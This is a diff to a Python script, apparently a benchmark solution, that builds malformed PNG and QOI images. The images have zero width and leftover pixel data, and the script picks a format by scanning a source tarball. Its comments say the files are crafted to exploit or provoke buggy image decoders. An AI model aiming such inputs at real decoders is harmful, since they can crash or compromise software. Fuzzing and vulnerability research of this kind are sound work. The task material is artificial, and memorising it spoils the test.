@@ -1,113 +1,67 @@
-import os
 import tarfile
-import io
 import zlib
-import binascii
 import struct
+
+
+def _make_png_zero_width(height=256, color_type=6, bit_depth=8, interlace=0):
+    def chunk(typ, data):
+        typ_b = typ.encode('ascii')
+        length = struct.pack(">I", len(data))
+        crc = zlib.crc32(typ_b)
+        crc = zlib.crc32(data, crc) & 0xffffffff
+        return length + typ_b + data + struct.pack(">I", crc)
+
+    # PNG signature
+    png = bytearray(b"\x89PNG\r\n\x1a\n")
+
+    # IHDR with width = 0, height > 0
+    ihdr_data = struct.pack(">IIBBBBB", 0, height, bit_depth, color_type, 0, 0, interlace)
+    png += chunk("IHDR", ihdr_data)
+
+    # IDAT: for width=0, each scanline is only the filter byte (we'll use filter type 0)
+    raw = b"\x00" * height
+    comp = zlib.compress(raw)
+
+    png += chunk("IDAT", comp)
+    png += chunk("IEND", b"")
+    return bytes(png)
+
+
+def _make_qoi_zero_dim(pixels=64, channels=4):
+    # QOI header: magic, width, height, channels, colorspace
+    # width=0, height=1 (or 0) to trigger zero dimension
+    width = 0
+    height = 1
+    header = b"qoif" + struct.pack(">II", width, height) + bytes([channels, 0])
+
+    # Payload: emit some pixels even though dimensions are zero to provoke buggy decoders
+    # Use QOI_OP_RGB (0xFE) followed by 3 bytes repeatedly
+    payload = bytearray()
+    for i in range(pixels):
+        payload.append(0xFE)
+        payload += bytes([(i * 3) & 0xFF, (i * 7) & 0xFF, (i * 11) & 0xFF])
+
+    # QOI end marker (padding): 7x0x00 + 0x01
+    end_marker = b"\x00" * 7 + b"\x01"
+    return header + bytes(payload) + end_marker
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Try to detect format; default to PNG
-        fmt = self._detect_format(src_path)
-        if fmt != "png":
-            # Fallback to PNG regardless; PNG crafted to exploit zero width/height
-            pass
-        return self._make_png_zero_width(height=17814)
-
-    def _detect_format(self, src_path: str) -> str:
-        # Heuristically detect project to choose format; default to png
-        detected = {"png": 0, "gif": 0, "webp": 0, "tiff": 0, "qoi": 0, "jpeg": 0}
+        fmt = "png"
         try:
             with tarfile.open(src_path, "r:*") as tf:
-                for m in tf.getmembers():
-                    if not m.isfile():
-                        continue
-                    name_lower = m.name.lower()
-                    # Signals from filenames
-                    if any(x in name_lower for x in ("png", "spng", "lodepng")):
-                        detected["png"] += 2
-                    if any(x in name_lower for x in ("gif", "giflib")):
-                        detected["gif"] += 1
-                    if "webp" in name_lower:
-                        detected["webp"] += 1
-                    if "tiff" in name_lower or "libtiff" in name_lower:
-                        detected["tiff"] += 1
-                    if "qoi" in name_lower:
-                        detected["qoi"] += 1
-                    if any(x in name_lower for x in ("jpeg", "jpg", "libjpeg", "turbojpeg", "openjpeg")):
-                        detected["jpeg"] += 1
-
-                    # Read small files to inspect contents
-                    if m.size > 1024 * 1024:
-                        continue
-                    f = tf.extractfile(m)
-                    if not f:
-                        continue
-                    try:
-                        data = f.read()
-                    finally:
-                        f.close()
-                    try:
-                        text = data.decode("utf-8", errors="ignore").lower()
-                    except Exception:
-                        text = ""
-
-                    if ("#include <png.h>" in text) or ("png_create_read_struct" in text) or ("ihdr" in text and "idat" in text):
-                        detected["png"] += 3
-                    if ("spng.h" in text) or ("libspng" in text):
-                        detected["png"] += 2
-                    if ("lodepng" in text):
-                        detected["png"] += 2
-                    if ("gif_lib.h" in text) or ("dgif" in text) or ("giffiletype" in text):
-                        detected["gif"] += 2
-                    if ("<webp/" in text) or ("webpdecode" in text) or ("webp" in text and "decode" in text):
-                        detected["webp"] += 2
-                    if ("<tiffio.h>" in text) or ("tiffopen" in text) or ("libtiff" in text):
-                        detected["tiff"] += 2
-                    if ("qoi.h" in text) or ("qoiformat" in text) or ("qoif" in text):
-                        detected["qoi"] += 2
-                    if ("jpeglib.h" in text) or ("libjpeg" in text) or ("turbojpeg" in text) or ("openjpeg" in text):
-                        detected["jpeg"] += 2
+                names = [m.name.lower() for m in tf.getmembers()]
+                # Prefer QOI if clearly present
+                if any("qoi" in n for n in names):
+                    fmt = "qoi"
+                elif any(("spng" in n or "lodepng" in n or "libpng" in n or "/png" in n or n.endswith("png.h") or n.endswith("png.c")) for n in names):
+                    fmt = "png"
+                elif any("stb_image" in n or "stb_image.h" in n for n in names):
+                    fmt = "png"
         except Exception:
-            pass
+            fmt = "png"
 
-        # Choose the most likely
-        best_fmt = "png"
-        best_score = -1
-        for k, v in detected.items():
-            if v > best_score:
-                best_fmt = k
-                best_score = v
-
-        # Prefer png on ties due to our crafted payload
-        if best_fmt not in ("png",):
-            return "png"
-        return best_fmt
-
-    def _crc32(self, data: bytes) -> int:
-        return binascii.crc32(data) & 0xffffffff
-
-    def _png_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
-        length = struct.pack(">I", len(data))
-        crc = struct.pack(">I", self._crc32(chunk_type + data))
-        return length + chunk_type + data + crc
-
-    def _make_png_zero_width(self, height: int) -> bytes:
-        # PNG signature
-        signature = b"\x89PNG\r\n\x1a\n"
-
-        # IHDR with width=0, height=height, bit depth=8, color type=6 (RGBA), compression=0, filter=0, interlace=0
-        width = 0
-        ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
-        ihdr_chunk = self._png_chunk(b"IHDR", ihdr_data)
-
-        # IDAT data: zlib-compressed stream of 'height' filter bytes (all 0 = filter type 'None')
-        raw = b"\x00" * height
-        compressed = zlib.compress(raw, 9)
-        idat_chunk = self._png_chunk(b"IDAT", compressed)
-
-        # IEND chunk
-        iend_chunk = self._png_chunk(b"IEND", b"")
-
-        return signature + ihdr_chunk + idat_chunk + iend_chunk
+        if fmt == "qoi":
+            return _make_qoi_zero_dim()
+        return _make_png_zero_width(height=512, color_type=6, bit_depth=8, interlace=0)
